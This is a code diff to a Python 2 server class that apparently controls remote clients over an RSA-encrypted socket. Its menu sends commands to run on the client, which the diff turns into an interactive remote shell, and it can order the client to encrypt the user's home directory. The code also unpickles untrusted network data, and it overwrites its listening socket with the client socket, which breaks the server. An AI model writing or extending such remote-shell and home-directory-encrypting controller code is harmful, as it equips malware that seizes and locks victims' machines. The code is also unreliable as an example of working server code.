@@ -41,10 +41,10 @@ class pyserver:
     
     def __exchangeKeys(self):
         self.__genKey()
-        print "Connected to the client"+str(self.clientsock.getpeername())+"exchanging the public keys\n"
-        self.clientsock.sendall(pickle.dumps(self.RSAKey.publickey(),None))
+        print "Connected to the client"+str(self.sock.getpeername())+"exchanging the public keys\n"
+        self.sock.sendall(pickle.dumps(self.RSAKey.publickey(),None))
         print "sent the pubKey\n"
-        buf = self.clientsock.recv(2048)
+        buf = self.sock.recv(2048)
         print "received ClientKey\n"
         clientKey=pickle.loads(buf)
         with open("clientKey",'wb') as f:
@@ -55,9 +55,9 @@ class pyserver:
     def acceptConn(self):
         while 1:
             try:
-                self.clientsock, clientaddr = self.sock.accept()
+                self.sock, clientaddr = self.sock.accept()
                 self.__exchangeKeys()
-                print "got connection from ", self.clientsock.getpeername()
+                print "got connection from ", self.sock.getpeername()
                 self.operations()
             except KeyboardInterrupt:
                 raise
@@ -82,9 +82,22 @@ class pyserver:
                 time.sleep(0.01)
                 self.sendData("QUIT")
             elif ip=='2':
-                self.sendData("CMD")
-                cmd=raw_input("enter the cmd to be executed\n")
-                self.sendData(cmd)
+                while True:
+                    self.sendData("CMD")
+                    cmd=raw_input("Opened an interactive Shell Terminal press 'q' to quit\n")
+                    if (cmd=="q"):
+                        break
+                    else:
+                        self.sendData(cmd)
+                        rdata=""
+                        while True:
+                            buf=(self.receiveData())
+                            if buf=="QUIT":
+                                break
+                            else:
+                                rdata+= buf
+                        print rdata
+                        
             elif ip=='3':
                 print"encrypting user home directory\n"
                 self.sendData('EFS')
@@ -97,6 +110,7 @@ class pyserver:
                 self.sendData("SCP")
             elif ip=='5':
                 print "Closing the connection to client"
+                self.sock.close()
                 break
             else:
                 print "please enter a valid input"
@@ -119,23 +133,18 @@ class pyserver:
         clientKey= RSA.importKey(key)
         clientKey = PKCS1_OAEP.new(clientKey)
         if(len(data)>100):
-            print "sending large data"
             for i in range(100,len(data),100):
                 secretText = clientKey.encrypt(data[i-100:i])
                 time.sleep(0.5)
-                self.clientsock.sendall(pickle.dumps(secretText.encode('base64')))
+                self.sock.sendall(pickle.dumps(secretText.encode('base64')))
             secretText=clientKey.encrypt(data[(i):len(data)])
             time.sleep(0.5)
-            self.clientsock.sendall(pickle.dumps(secretText.encode('base64')))
-            print "sent large data"
+            self.sock.sendall(pickle.dumps(secretText.encode('base64')))
         else:
-            print "sending small data"
             while len(data)<100:
                 data+='~'
-            print data
             secretText=clientKey.encrypt(data)
-            self.clientsock.sendall(pickle.dumps(secretText.encode('base64')))
-            print "sent small data"
+            self.sock.sendall(pickle.dumps(secretText.encode('base64')))
 
 if __name__ == '__main__':
     try:
